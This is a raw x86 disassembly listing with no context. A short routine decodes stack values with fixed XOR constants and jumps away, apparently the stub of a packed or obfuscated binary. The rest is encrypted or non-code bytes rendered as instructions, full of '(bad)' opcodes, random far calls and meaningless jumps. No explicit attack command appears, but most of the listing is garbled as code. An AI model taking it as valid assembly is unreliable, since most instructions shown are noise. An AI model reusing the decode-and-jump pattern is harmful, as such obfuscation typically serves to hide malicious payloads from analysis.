  40b087:	xor    edx,edx
  40b089:	pop    edx
  40b08a:	add    edx,0x8
  40b08d:	push   edx
  40b08e:	pop    ecx
  40b08f:	push   0x6
  40b091:	dec    ecx
  40b092:	pop    ebx
  40b093:	dec    ebx
  40b094:	xchg   ebx,ecx
  40b096:	sub    ebx,ecx
  40b098:	xchg   ebx,ecx
  40b09a:	dec    ecx
  40b09b:	mov    eax,DWORD PTR [ebp-0x1c]
  40b09e:	imul   eax,ecx
  40b0a1:	sub    esp,eax
  40b0a3:	mov    DWORD PTR [ebp-0x20],esp
  40b0a6:	mov    eax,DWORD PTR [ebp-0x4]
  40b0a9:	mov    ecx,0x7510893
  40b0ae:	xor    eax,ecx
  40b0b0:	mov    edx,0x3272db
  40b0b5:	add    eax,edx
  40b0b7:	mov    DWORD PTR [ebp+0x8],eax
  40b0ba:	mov    eax,DWORD PTR [ebp-0x14]
  40b0bd:	xor    eax,ecx
  40b0bf:	add    eax,edx
  40b0c1:	mov    edx,DWORD PTR [ebp+0x14]
  40b0c4:	jmp    0x40d429
  40b0c9:	fidiv  DWORD PTR [ecx+0x21]
  40b0cc:	jb     0x40b137
  40b0ce:	xor    ch,BYTE PTR [ecx-0x57]
  40b0d1:	ss pop es
  40b0d3:	add    eax,0x6b87649b
  40b0d8:	push   ebx
  40b0d9:	call   0x3aa313d3
  40b0de:	pop    edi
  40b0df:	bound  esp,QWORD PTR [edx-0x34]
  40b0e2:	jne    0x40b15e
  40b0e4:	fsub   DWORD PTR [ebx]
  40b0e6:	mov    DWORD PTR [ebp-0x4cb6d93],eax
  40b0ec:	dec    ecx
  40b0ed:	sub    DWORD PTR [ebx+0x13],ebx
  40b0f0:	sbb    eax,0xe5a1a07d
  40b0f5:	data16 xor BYTE PTR ss:[ebx+0x767e612e],cl
  40b0fd:	ds int3 
  40b0ff:	xchg   ecx,eax
  40b100:	adc    al,0x72
  40b102:	aam    0xea
  40b104:	cli    
  40b105:	(bad)  
  40b106:	loop   0x40b176
  40b108:	jl     0x40b150
  40b10a:	ror    BYTE PTR [eax],cl
  40b10c:	sbb    eax,0x5f075c5
  40b111:	pop    edi
  40b112:	dec    esp
  40b113:	test   eax,edi
  40b115:	jl     0x40b12e
  40b117:	ror    BYTE PTR [edx-0x4c],cl
  40b11a:	xchg   ebx,eax
  40b11b:	aam    0x23
  40b11d:	inc    edx
  40b11e:	mov    dl,0x70
  40b120:	(bad)  
  40b121:	(bad)  
  40b122:	ror    bx,1
  40b125:	lahf   
  40b126:	pusha  
  40b127:	xor    al,0x5d
  40b129:	addr16 mov ch,0x41
  40b12c:	lods   eax,DWORD PTR ds:[esi]
  40b12d:	add    al,0x5f
  40b12f:	sub    BYTE PTR [ebx],bh
  40b131:	movs   DWORD PTR es:[di],DWORD PTR ss:[si]
  40b134:	push   eax
  40b135:	call   0x901d:0x4e970330
  40b13c:	mov    ebx,0xebe7630f
  40b141:	sub    BYTE PTR [edx],ah
  40b143:	ret    
  40b144:	mov    ch,0x9b
  40b146:	rcr    esi,0xce
  40b149:	mov    ah,0x71
  40b14b:	mov    eax,0xc1aee600
  40b150:	xor    cl,bh
  40b152:	adc    DWORD PTR [ebx],ecx
  40b154:	or     ecx,0x801af8f8
  40b15a:	shl    BYTE PTR [esi],0xdd
  40b15d:	add    ch,BYTE PTR [edi]
  40b15f:	jmp    0x40b159
  40b161:	popf   
  40b162:	sub    BYTE PTR [edx+0x323f3801],0x40
  40b169:	repnz (bad) 
  40b16b:	adc    edi,DWORD PTR ss:[edx+0xf34a6e2]
  40b172:	jo     0x40b10b
  40b174:	nop
  40b175:	sub    dl,ch
  40b177:	pop    ebx
  40b178:	sbb    al,0xc5
  40b17a:	pop    ds
  40b17b:	inc    esp
  40b17c:	push   esp
  40b17d:	sbb    al,0x61
  40b17f:	js     0x40b1a5
  40b181:	jl     0x40b1d6
  40b183:	into   
  40b184:	sub    ebx,esp
  40b186:	or     ecx,DWORD PTR [edi]
  40b188:	xchg   ebx,eax
  40b189:	leave  
  40b18a:	sub    DWORD PTR [ebp-0x1],0x6c5c3f64
  40b191:	push   cs
  40b192:	stos   BYTE PTR es:[edi],al
  40b193:	inc    ecx
  40b194:	(bad)  
  40b195:	(bad)  
  40b196:	mov    edx,0x2c81c2dd
  40b19b:	aas    
  40b19c:	sub    eax,0x9e8acfd9
  40b1a1:	stos   DWORD PTR es:[edi],eax
  40b1a2:	out    0x6a,eax
  40b1a4:	outs   dx,BYTE PTR ds:[esi]
  40b1a5:	pop    ss
  40b1a6:	aam    0xdf
  40b1a8:	adc    DWORD PTR [ebp+eax*2+0x30b6af0f],edi
  40b1af:	xchg   DWORD PTR [ebx+0x67],ebx
  40b1b2:	(bad)  
  40b1b3:	mov    ebx,0xfba1a068
  40b1b8:	add    WORD PTR [eax],si
  40b1bb:	cmp    ch,dl
  40b1bd:	mov    ebx,0x807a40d9
  40b1c2:	les    esp,FWORD PTR [ebx]
  40b1c4:	jmp    0x2c03f68
  40b1c9:	and    DWORD PTR [eiz*8-0x522cf4ae],0xe8831550
  40b1d4:	outs   dx,DWORD PTR ds:[esi]
  40b1d5:	call   0x4881:0xa88baa52
  40b1dc:	cmp    al,0x8
  40b1de:	xchg   ecx,eax
  40b1df:	retf   
  40b1e0:	mov    ebp,ds
  40b1e2:	mov    dh,0x46
  40b1e4:	pop    edi
  40b1e5:	cmp    al,BYTE PTR [edi-0xe1ff460]
  40b1eb:	and    DWORD PTR [eax],ebp
  40b1ed:	or     ecx,DWORD PTR [eax-0x1a]
  40b1f0:	les    ebx,FWORD PTR ds:0x4e4333b6
  40b1f6:	div    BYTE PTR [ecx+eiz*4-0x74]
  40b1fa:	sbb    BYTE PTR [edx],ch
  40b1fc:	adc    DWORD PTR [edi],esi
  40b1fe:	ror    DWORD PTR [ebx],1
  40b200:	mov    esp,0x63eb2cc9
  40b205:	inc    ebp
  40b206:	aas    
  40b207:	mov    esp,0x165725cf
  40b20c:	es cld 
  40b20e:	and    al,0xc2
  40b210:	mov    al,0xe8
  40b212:	jmp    0xd728:0xdd2324cc
  40b219:	xlat   BYTE PTR ds:[ebx]
  40b21a:	clc    
  40b21b:	enter  0x5113,0x91
  40b21f:	shr    al,0x61
  40b222:	push   0x53
  40b224:	loopne 0x40b208
  40b226:	lods   eax,DWORD PTR ds:[esi]
  40b227:	imul   eax,DWORD PTR [edx-0x620023ff],0x7df6608
  40b231:	int    0xac
  40b233:	sub    eax,0xbac1e4ff
  40b238:	dec    ecx
  40b239:	and    DWORD PTR [eax+0x1ce1f9c8],edx
  40b23f:	cmp    edi,edx
  40b241:	sub    DWORD PTR ds:0x5a0eefb7,0xe9e39924
  40b24b:	gs mov dh,0xf2
  40b24e:	dec    esp
  40b24f:	mov    ebx,0x6d1368aa
  40b254:	f2xm1  
  40b256:	jle    0x40b2d4
  40b258:	push   eax
  40b259:	ja     0x40b251
  40b25b:	stos   DWORD PTR es:[edi],eax
  40b25c:	das    
  40b25d:	sub    al,0xb0
  40b25f:	jmp    0x602d81dc
  40b264:	dec    eax
  40b265:	cmp    eax,0x1b86fbba
  40b26a:	ret    
  40b26b:	fbld   TBYTE PTR ds:0xd24315f2
  40b271:	int3   
  40b272:	xlat   BYTE PTR ds:[ebx]
  40b273:	retf   
  40b274:	(bad)  
  40b275:	sub    DWORD PTR [edx-0x2eb690af],ebp
  40b27b:	das    
  40b27c:	(bad)  
  40b27d:	and    eax,0x9299201e
  40b282:	mov    dl,0x5
  40b284:	mov    ch,0xa5
  40b286:	mov    ebp,0x1803d64e
  40b28b:	add    BYTE PTR [edx+0x21],dl
  40b28e:	jmp    0x40b240
  40b290:	jmp    0xb70f0eec
  40b295:	xlat   BYTE PTR ds:[ebx]
  40b296:	(bad)  
  40b297:	iret   
  40b298:	mov    ebx,DWORD PTR [ebx-0x5f]
  40b29b:	xchg   DWORD PTR [ecx+eax*1-0x15d9d090],ecx
  40b2a2:	ret    
  40b2a3:	add    al,0x1b
  40b2a5:	and    eax,0x6fc4d934
  40b2aa:	test   DWORD PTR [eax+0x58f9c127],ebx
  40b2b0:	mov    cx,0xaa8
  40b2b4:	call   0xcf8d:0xe50ec086
  40b2bb:	mov    eax,ds:0xbc9cbb6c
  40b2c0:	stc    
  40b2c1:	push   edx
  40b2c2:	jl     0x40b2f8
  40b2c4:	xor    al,0x9b
  40b2c6:	out    0xd8,eax
  40b2c8:	in     al,dx
  40b2c9:	popf   
  40b2ca:	push   cs
  40b2cb:	lahf   
  40b2cc:	adc    al,0x56
  40b2ce:	adc    eax,0x171e5810
  40b2d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b2d4:	retf   
  40b2d5:	inc    eax
  40b2d6:	adc    ch,BYTE PTR [esi-0x19]
  40b2d9:	or     eax,DWORD PTR [edi+0x3fef890c]
  40b2df:	fist   WORD PTR [edx-0x1db124a0]
  40b2e5:	je     0x30f71ce
  40b2eb:	mov    al,ds:0x90c50713
  40b2f0:	inc    edx
  40b2f1:	inc    ebp
  40b2f2:	sbb    BYTE PTR [edx-0x2dafc405],dl
  40b2f8:	nop
  40b2f9:	sub    al,0x50
  40b2fb:	pop    ebp
  40b2fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b2fd:	push   ds
  40b2fe:	ds and eax,0xc248338a
  40b304:	push   0x5e
  40b306:	mov    ah,bh
  40b308:	pop    edx
  40b309:	dec    esp
  40b30a:	xchg   esp,eax
  40b30b:	pop    eax
  40b30c:	cwde   
  40b30d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b30e:	mov    eax,0xb2f6e64c
  40b313:	lahf   
  40b314:	and    edi,DWORD PTR [esi-0x3d]
  40b317:	fwait
  40b318:	inc    eax
  40b319:	push   ecx
  40b31a:	jg     0x40b37a
  40b31c:	xchg   edx,eax
  40b31d:	xchg   BYTE PTR [edx+0x63a1e82c],al
  40b323:	dec    esp
  40b324:	js     0x40b36f
  40b326:	and    DWORD PTR ds:0xa57d5a8c,ebx
  40b32c:	mov    ebx,0x86c804f9
  40b331:	clc    
  40b332:	inc    DWORD PTR [edi]
  40b334:	retf   0x9fdd
  40b337:	test   DWORD PTR [ebx-0x7561b0c8],ecx
  40b33d:	pop    ecx
  40b33e:	out    0x32,al
  40b340:	popf   
  40b341:	iret   
  40b342:	push   ebp
  40b343:	add    dh,BYTE PTR [ebx+esi*8]
  40b346:	jl     0x40b33b
  40b348:	jnp    0x40b2f7
  40b34a:	stos   DWORD PTR es:[edi],eax
  40b34b:	(bad)  
  40b34c:	push   esp
  40b34d:	repz pop esi
  40b34f:	ret    0x6996
  40b352:	leave  
  40b353:	cs test eax,0xfd6a2b0f
  40b359:	push   ds
  40b35a:	sub    al,0xa2
  40b35c:	call   0xa9ce:0x8c160657
  40b363:	jns    0x40b378
  40b365:	(bad)  
  40b366:	sbb    dl,BYTE PTR [edi]
  40b368:	push   0x21
  40b36a:	out    dx,eax
  40b36b:	push   esi
  40b36c:	mov    esp,0x8f4c6623
  40b371:	test   ebp,ebp
  40b373:	sub    DWORD PTR [eax+0x46ebbdca],esi
  40b379:	fst    st(3)
  40b37b:	dec    ecx
  40b37c:	icebp  
  40b37d:	fnstenv [ebp-0x40]
  40b380:	fisub  DWORD PTR [ecx+0x5fda33c3]
  40b386:	pop    ecx
  40b387:	and    ecx,esp
  40b389:	or     eax,0x4de1cdcd
  40b38e:	ret    0xcf63
  40b391:	pop    edi
  40b392:	fcmovnu st,st(1)
  40b394:	(bad)  
  40b395:	in     al,0x1
  40b397:	mov    cl,0x1b
  40b399:	sahf   
  40b39a:	push   ds
  40b39b:	inc    ebx
  40b39c:	fmul   QWORD PTR [ebx]
  40b39e:	xchg   ecx,eax
  40b39f:	in     al,0xa1
  40b3a1:	add    al,0xda
  40b3a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b3a4:	cmp    dl,BYTE PTR [ebx]
  40b3a6:	popa   
  40b3a7:	lea    ebp,[esi+0x6f8fa405]
  40b3ad:	scas   al,BYTE PTR es:[edi]
  40b3ae:	jg     0x40b370
  40b3b0:	(bad)  
  40b3b1:	into   
  40b3b2:	pop    ss
  40b3b3:	cmp    DWORD PTR [eax+0x34],edi
  40b3b6:	cwde   
  40b3b7:	fistp  QWORD PTR fs:[eax+0x288f9a11]
  40b3be:	sbb    DWORD PTR [esi-0x23],ebp
  40b3c1:	push   es
  40b3c2:	add    ebx,DWORD PTR [edx-0x10a04361]
  40b3c8:	shl    BYTE PTR [ebx+0x62],0xb6
  40b3cc:	jl     0x40b413
  40b3ce:	pop    es
  40b3cf:	loope  0x40b369
  40b3d1:	or     ebx,edx
  40b3d3:	or     ecx,DWORD PTR [ebp-0x18c38652]
  40b3d9:	or     DWORD PTR [edi+eax*1],edx
  40b3dc:	pop    es
  40b3dd:	loopne 0x40b434
  40b3df:	cmc    
  40b3e0:	sahf   
  40b3e1:	sbb    al,0xe4
  40b3e3:	pop    ebp
  40b3e4:	cmp    BYTE PTR ds:0x4584a83e,bh
  40b3ea:	cmp    BYTE PTR [edi],bh
  40b3ec:	outs   dx,DWORD PTR ds:[esi]
  40b3ed:	adc    DWORD PTR ds:0x2d20136e,eax
  40b3f3:	xor    ecx,esi
  40b3f5:	sub    edi,DWORD PTR [esi+0x7af52275]
  40b3fb:	rcr    DWORD PTR [edi-0x17],0x36
  40b3ff:	in     eax,0xce
  40b401:	inc    edi
  40b402:	call   0xf19d:0xcfb8890f
  40b409:	(bad)  
  40b40a:	ror    BYTE PTR [ebx],1
  40b40c:	jmp    FWORD PTR [ecx]
  40b40e:	shl    DWORD PTR [ebx-0x78797ade],1
  40b414:	sbb    esi,ecx
  40b416:	imul   esi,DWORD PTR [esi+0x77c39082],0xffffffd2
  40b41d:	sub    BYTE PTR [edi],bh
  40b41f:	jp     0x40b49c
  40b421:	xchg   ebx,eax
  40b422:	add    ebx,edx
  40b424:	and    eax,0x57c762ac
  40b429:	(bad)  
  40b42a:	mov    esp,0xb0e881c3
  40b42f:	mov    ecx,0x5203835f
  40b434:	xchg   esi,eax
  40b435:	jecxz  0x40b434
  40b437:	dec    esp
  40b438:	cmc    
  40b439:	cmp    esi,esp
  40b43b:	mov    eax,ds:0x2e4cfda0
  40b440:	cdq    
  40b441:	gs jno 0x40b44c
  40b444:	sbb    BYTE PTR [ebp+0x7d1df51f],ah
  40b44a:	inc    DWORD PTR [ecx+0x5955be7f]
  40b450:	xor    bh,BYTE PTR ds:0xbdc1e8f2
  40b456:	mov    cl,BYTE PTR ds:0x9c2a0a91
  40b45c:	mov    ds,WORD PTR [edx+0x3de7f177]
  40b462:	retf   
  40b463:	adc    eax,0x7391b773
  40b468:	pop    ecx
  40b469:	push   ecx
  40b46a:	mov    edi,0xc5b75ab6
  40b46f:	test   DWORD PTR [edx+ebp*8],ebp
  40b472:	fisub  WORD PTR ds:0x4804fcc8
  40b478:	sbb    al,cl
  40b47a:	and    bl,BYTE PTR [ebp-0x58]
  40b47d:	bound  esi,QWORD PTR [ebx+eax*1+0x63f71b8d]
  40b484:	xor    al,BYTE PTR [ebp-0x1ed61820]
  40b48a:	dec    ebx
  40b48b:	in     al,0x64
  40b48d:	ror    BYTE PTR [ebx-0x7a],0x38
  40b491:	test   eax,0xdebf1b73
  40b496:	sbb    DWORD PTR [eax+0x46],ecx
  40b499:	ror    bh,0xb7
  40b49c:	push   ss
  40b49d:	aam    0x20
  40b49f:	repz cdq 
  40b4a1:	pop    ecx
  40b4a2:	out    0x5f,al
  40b4a4:	loopne 0x40b442
  40b4a6:	hlt    
  40b4a7:	inc    esp
  40b4a8:	adc    BYTE PTR [esi-0x24],0xc4
  40b4ac:	lock push ecx
  40b4ae:	and    ebx,DWORD PTR [edi+0x31c354f3]
  40b4b4:	mov    al,0x71
  40b4b6:	sbb    eax,0xd071c492
  40b4bb:	inc    ebx
  40b4bc:	cmp    DWORD PTR [esi],0xffffffcf
  40b4bf:	icebp  
  40b4c0:	(bad)  
  40b4c1:	xor    cl,cl
  40b4c3:	or     al,dl
  40b4c5:	jns    0x40b4dc
  40b4c7:	jb     0x40b4d0
  40b4c9:	(bad)  
  40b4ca:	jb     0x40b45c
  40b4cc:	pop    ebp
  40b4cd:	cld    
  40b4ce:	adc    ebp,DWORD PTR [ecx-0x482d9cb5]
  40b4d4:	push   esi
  40b4d5:	xor    cl,BYTE PTR [ecx+0x46ab1980]
  40b4db:	(bad)  
  40b4dc:	sub    eax,0xc649239f
  40b4e1:	jne    0x40b4e6
  40b4e3:	lock adc esi,0x1d
  40b4e7:	mov    bl,BYTE PTR [edx+0x61d961e9]
  40b4ed:	retf   0x7951
  40b4f0:	dec    ebx
  40b4f1:	cld    
  40b4f2:	push   ecx
  40b4f3:	sbb    eax,0x994031a5
  40b4f8:	fist   WORD PTR [eax-0x51]
  40b4fb:	ror    esp,0x35
  40b4fe:	(bad)  
  40b501:	psubsw mm4,QWORD PTR [edx-0x2c]
  40b505:	cmp    BYTE PTR [ecx+0x46],bl
  40b508:	jp     0x40b52c
  40b50a:	mov    dl,0x6
  40b50c:	fist   WORD PTR [ebx]
  40b50e:	jp     0x40b4a9
  40b510:	xchg   ebp,eax
  40b511:	fs inc edi
  40b513:	and    ebp,eax
  40b515:	rol    DWORD PTR [edi+esi*2],cl
  40b518:	loop   0x40b570
  40b51a:	add    bl,BYTE PTR [ebx]
  40b51c:	pusha  
  40b51d:	pop    esp
  40b51e:	les    eax,FWORD PTR ds:0x83958297
  40b524:	dec    esi
  40b525:	dec    esi
  40b526:	(bad)  
  40b527:	cmp    cl,BYTE PTR [ecx-0x6a8231d9]
  40b52d:	outs   dx,DWORD PTR ds:[esi]
  40b52e:	dec    ebx
  40b52f:	sbb    DWORD PTR [eax-0x15],ebx
  40b532:	mov    al,0x3f
  40b534:	enter  0xd1df,0x96
  40b538:	sub    DWORD PTR [ecx+0x36],esp
  40b53b:	mov    ds,WORD PTR [edx+esi*1+0x7e]
  40b53f:	xchg   edi,esi
  40b541:	stos   BYTE PTR es:[edi],al
  40b542:	dec    ebx
  40b543:	push   ecx
  40b544:	retf   0x560
  40b547:	dec    esi
  40b548:	je     0x40b555
  40b54a:	lea    edi,[edi+0x6f]
  40b54d:	xchg   esp,eax
  40b54e:	(bad)  
  40b54f:	in     al,0xd0
  40b551:	push   ecx
  40b552:	jo     0x40b4dd
  40b554:	mov    al,BYTE PTR ds:0x155292eb
  40b55a:	push   ss
  40b55b:	jno    0x40b525
  40b55d:	dec    ebp
  40b55e:	arpl   WORD PTR [edx],dx
  40b560:	sbb    al,BYTE PTR es:[eax-0x6fc96741]
  40b567:	cdq    
  40b568:	jno    0x40b57f
  40b56a:	push   ds
  40b56b:	dec    ebp
  40b56c:	out    0xca,al
  40b56e:	sub    BYTE PTR [edi-0x1cfbb583],dl
  40b574:	xor    ebp,esp
  40b576:	(bad)  
  40b578:	adc    eax,0x8877a5a0
  40b57d:	iret   
  40b57e:	mov    dl,0xb3
  40b580:	daa    
  40b581:	cmp    DWORD PTR [edx-0x6967b40d],edx
  40b587:	in     eax,dx
  40b588:	leave  
  40b589:	adc    bh,BYTE PTR ds:0xc4eee633
  40b58f:	mov    dh,0xd8
  40b591:	stos   BYTE PTR es:[edi],al
  40b592:	ffree  st(0)
  40b594:	adc    al,0x48
  40b596:	xchg   ebp,eax
  40b597:	mov    ebp,0x81997b74
  40b59c:	cld    
  40b59d:	imul   esi,DWORD PTR [ebp-0x17],0x65a3668d
  40b5a4:	call   0xbb03fba0
  40b5a9:	xchg   edx,eax
  40b5aa:	xor    BYTE PTR [eax],0x26
  40b5ad:	(bad)  
  40b5ae:	or     eax,0x88c5ada2
  40b5b3:	or     dl,BYTE PTR [esi]
  40b5b5:	jl     0x40b55f
  40b5b7:	jnp    0x40b5be
  40b5b9:	into   
  40b5ba:	cmp    al,0x3b
  40b5bc:	scas   al,BYTE PTR es:[edi]
  40b5bd:	inc    ecx
  40b5be:	loopne 0x40b62c
  40b5c0:	call   0xe779:0x6ec3a056
  40b5c7:	push   cs
  40b5c8:	pop    eax
  40b5c9:	test   eax,0x4c951e65
  40b5ce:	push   ebx
  40b5cf:	sub    eax,0x38e3d8c6
  40b5d4:	cdq    
  40b5d5:	cmc    
  40b5d6:	xor    eax,0xc066d6b9
  40b5db:	mov    edi,0xa41d9adb
  40b5e0:	call   0x8926:0x2b336407
  40b5e7:	sbb    bh,BYTE PTR ds:0x30e6e655
  40b5ed:	jae    0x40b600
  40b5ef:	in     al,dx
  40b5f0:	mov    edi,0x715cd6df
  40b5f5:	nop
  40b5f6:	je     0x40b661
  40b5f8:	and    eax,0x1894f84e
  40b5fd:	pop    ss
  40b5fe:	jbe    0x40b5ed
  40b600:	sub    BYTE PTR [ecx+ecx*4+0x57],dl
  40b604:	mov    ch,0xe0
  40b606:	push   edx
  40b607:	int3   
  40b608:	jae    0x40b689
  40b60a:	cmp    DWORD PTR ds:0x33886f2c,0x43d96fef
  40b614:	dec    eax
  40b615:	jb     0x40b597
  40b617:	loope  0x40b659
  40b619:	dec    ebx
  40b61a:	push   cs
  40b61b:	push   esi
  40b61c:	jo     0x40b671
  40b61e:	add    ebx,DWORD PTR [edi+0x4d]
  40b621:	daa    
  40b622:	jge    0x40b60e
  40b624:	arpl   WORD PTR [ebx-0x51],bp
  40b627:	lds    esp,FWORD PTR [eax]
  40b629:	ret    
  40b62a:	idiv   DWORD PTR [esi+0x17]
  40b62d:	ror    esi,0xda
  40b630:	std    
  40b631:	frstor [ecx+eax*2+0xa]
  40b635:	bound  edi,QWORD PTR [ebp-0xe]
  40b638:	(bad)  
  40b639:	xchg   esp,eax
  40b63a:	stos   BYTE PTR es:[edi],al
  40b63b:	inc    ebx
  40b63c:	xor    al,0x41
  40b63e:	or     esp,eax
  40b640:	imul   eax,ebp,0xb586a76
  40b646:	in     al,dx
  40b647:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b648:	xor    cl,BYTE PTR [ebx+0x2127d862]
  40b64e:	pushf  
  40b64f:	retf   0xe66
  40b652:	pop    ds
  40b653:	out    dx,eax
  40b654:	cmp    eax,DWORD PTR [edx-0x72aee3]
  40b65a:	pop    edi
  40b65b:	aad    0x20
  40b65d:	cmp    eax,0xeb5a0ac4
  40b662:	dec    eax
  40b663:	push   eax
  40b664:	out    0x70,al
  40b666:	ret    
  40b667:	inc    ebx
  40b668:	xor    eax,0x4dd03f51
  40b66d:	nop
  40b66e:	sbb    DWORD PTR [edx-0xb],0x5c
  40b672:	sbb    al,0xe3
  40b674:	cli    
  40b675:	add    edx,DWORD PTR [esi-0x3ad81722]
  40b67b:	jle    0x40b61d
  40b67d:	push   cs
  40b67e:	rol    DWORD PTR [edi+0x42a7c952],1
  40b684:	xchg   edi,eax
  40b685:	gs cmp al,ch
  40b688:	push   ebx
  40b689:	xor    BYTE PTR [esi],bl
  40b68b:	add    al,BYTE PTR [ecx-0x6e]
  40b68e:	mov    ebp,0xdc95f0cc
  40b693:	fnsave fs:[edi]
  40b696:	push   0xb681d0d0
  40b69b:	mov    dh,0x29
  40b69d:	mov    dh,0xae
  40b69f:	add    al,ah
  40b6a1:	pushf  
  40b6a2:	test   DWORD PTR [ecx-0x6f4029c4],esi
  40b6a8:	inc    eax
  40b6a9:	ror    BYTE PTR [ebp-0x48],cl
  40b6ac:	or     edi,eax
  40b6ae:	pop    ebx
  40b6af:	int3   
  40b6b0:	push   ecx
  40b6b1:	popf   
  40b6b2:	sbb    BYTE PTR [ebx+0x24153e90],0x62
  40b6b9:	repz arpl WORD PTR [edi],sp
  40b6bc:	scas   eax,DWORD PTR es:[edi]
  40b6bd:	rcl    BYTE PTR ds:[esi-0x29bc9c41],1
  40b6c4:	jb     0x40b6a6
  40b6c6:	mov    dh,BYTE PTR [edi]
  40b6c8:	nop
  40b6c9:	out    dx,eax
  40b6ca:	mov    esi,0x5af3e19b
  40b6cf:	call   0xb83a9e6e
  40b6d4:	or     BYTE PTR [ebp-0x26],ah
  40b6d7:	adc    ebp,DWORD PTR [ebx+0x52]
  40b6da:	inc    ebp
  40b6db:	dec    ebp
  40b6dc:	repnz dec ecx
  40b6de:	mov    edi,0x42f1a52a
  40b6e3:	jno    0x40b70a
  40b6e5:	xor    eax,0x342690eb
  40b6ea:	retf   
  40b6eb:	fdivr  QWORD PTR [ebx-0x1353e407]
  40b6f1:	test   DWORD PTR [edx+0xf],0x51d28152
  40b6f8:	clc    
  40b6f9:	sub    BYTE PTR [ebx+0x36ce59dc],al
  40b6ff:	test   BYTE PTR [ecx+ebx*2+0x517f412d],bh
  40b706:	bound  ebx,QWORD PTR ds:0x90006043
  40b70c:	pop    ss
  40b70d:	mov    esi,0x80bd5b4d
  40b712:	data16 out dx,al
  40b714:	repz xor al,0xdf
  40b717:	jle    0x40b6ff
  40b719:	nop
  40b71a:	(bad)  
  40b71c:	std    
  40b71d:	js     0x40b78d
  40b71f:	mov    eax,0xb3ef7cd8
  40b724:	pop    ebp
  40b725:	mov    al,ds:0xb65a42a3
  40b72a:	stos   BYTE PTR es:[edi],al
  40b72b:	or     DWORD PTR [ebx-0x6ff46cfd],0xffffff82
  40b732:	test   edi,ebx
  40b734:	add    eax,0xd3c30eff
  40b739:	and    cl,BYTE PTR [eax+0x63]
  40b73c:	or     eax,ebx
  40b73e:	inc    edx
  40b73f:	add    eax,0x2d5fc7e0
  40b744:	push   ebp
  40b745:	(bad)  
  40b746:	dec    esi
  40b747:	xor    ecx,0x2731bc66
  40b74d:	loopne 0x40b7b0
  40b74f:	mov    eax,0x2de6bd4b
  40b754:	push   eax
  40b755:	js     0x40b6e0
  40b757:	xlat   BYTE PTR ds:[ebx]
  40b758:	sbb    ch,BYTE PTR [edx]
  40b75a:	sbb    eax,0x7faa8b1a
  40b75f:	mov    al,0x49
  40b761:	imul   BYTE PTR [edx]
  40b763:	or     eax,0x6943306
  40b768:	inc    ebp
  40b769:	xor    DWORD PTR [edx-0x79],0x2a586e82
  40b770:	lea    edx,[eax+0x75]
  40b773:	xchg   esi,eax
  40b774:	pop    DWORD PTR [esi+0x2c]
  40b777:	push   eax
  40b778:	mov    al,0x41
  40b77a:	mov    ebp,0xa3cc4b6e
  40b77f:	adc    esp,DWORD PTR [ebx]
  40b781:	jp     0x40b7a2
  40b783:	aas    
  40b784:	ins    BYTE PTR es:[edi],dx
  40b785:	test   BYTE PTR [edx+0x1],dl
  40b788:	mov    esi,0xd7cd20c0
  40b78d:	jmp    0xcc8:0xbb88b6b8
  40b794:	and    BYTE PTR [ecx],dh
  40b796:	or     ebx,DWORD PTR [ebx+edx*1+0x5b8265a3]
  40b79d:	dec    edi
  40b79e:	fisub  WORD PTR [esi]
  40b7a0:	xchg   edx,eax
  40b7a1:	repz iret 
  40b7a3:	xor    al,0x4d
  40b7a5:	cmc    
  40b7a6:	adc    al,0xbd
  40b7a8:	inc    edi
  40b7a9:	dec    esi
  40b7aa:	push   ebx
  40b7ab:	sar    DWORD PTR [edi+0x5e301abf],cl
  40b7b1:	std    
  40b7b2:	nop    DWORD PTR [ebx+0x13]
  40b7b6:	and    eax,0xa1d7feb7
  40b7bb:	or     dh,BYTE PTR [edi]
  40b7bd:	push   esp
  40b7be:	sahf   
  40b7bf:	cmp    ebp,DWORD PTR [eax-0x73]
  40b7c2:	imul   ebp,DWORD PTR [ebp+0x4],0x16
  40b7c6:	pop    ebx
  40b7c7:	or     BYTE PTR ds:0xa947465e,al
  40b7cd:	jo     0x40b794
  40b7cf:	sahf   
  40b7d0:	loopne 0x40b7fe
  40b7d2:	jge    0x40b780
  40b7d4:	shr    BYTE PTR [eax+0x6b69815f],0xa6
  40b7db:	mov    ds,WORD PTR [esi-0x16]
  40b7de:	or     bh,cl
  40b7e0:	rcl    ecx,0x5b
  40b7e3:	fstp   TBYTE PTR [ebx+eiz*8]
  40b7e6:	add    DWORD PTR [edx+esi*8+0x28d487b6],0xffffffe4
  40b7ee:	leave  
  40b7ef:	mov    ds:0x40184123,al
  40b7f4:	jmp    0x40b7c2
  40b7f6:	enter  0xb7a8,0xef
  40b7fa:	ja     0x40b82e
  40b7fc:	loope  0x40b7be
  40b7fe:	stos   BYTE PTR es:[edi],al
  40b7ff:	js     0x40b7f8
  40b801:	or     esi,ebx
  40b803:	mov    bh,0xa6
  40b805:	faddp  st(7),st
  40b807:	sbb    bl,ch
  40b809:	retf   
  40b80a:	and    eax,0x5fe67a13
  40b80f:	xchg   esp,eax
  40b810:	cmp    eax,0xeb7e5db8
  40b815:	(bad)  
  40b816:	pushf  
  40b817:	sbb    ebx,DWORD PTR [edx]
  40b819:	stos   BYTE PTR es:[edi],al
  40b81a:	clc    
  40b81b:	jmp    0xc3d34b6a
  40b820:	sub    bh,BYTE PTR [ebx-0x5f]
  40b823:	mov    cl,0x68
  40b825:	jle    0x40b873
  40b827:	in     eax,0x71
  40b829:	pop    gs
  40b82b:	add    DWORD PTR [ecx+ecx*4+0x70e6f43],edx
  40b832:	pop    edi
  40b833:	iret   
  40b834:	hlt    
  40b835:	inc    ecx
  40b836:	pop    ebp
  40b837:	aas    
  40b838:	sub    esi,DWORD PTR [ebx]
  40b83a:	(bad)  
  40b83b:	(bad)  
  40b83c:	jmp    0x40b862
  40b83e:	(bad)  
  40b83f:	xchg   edi,eax
  40b840:	cmp    eax,0x2b141b28
  40b845:	sub    al,0x91
  40b847:	aam    0x76
  40b849:	mov    ecx,0x6a3e123f
  40b84e:	aas    
  40b84f:	imul   edi,DWORD PTR [edi-0x5ad0e0ea],0xad536c58
  40b859:	rol    eax,1
  40b85b:	pop    esi
  40b85c:	scas   al,BYTE PTR es:[edi]
  40b85d:	test   eax,0x5e58f6d3
  40b862:	sub    eax,esi
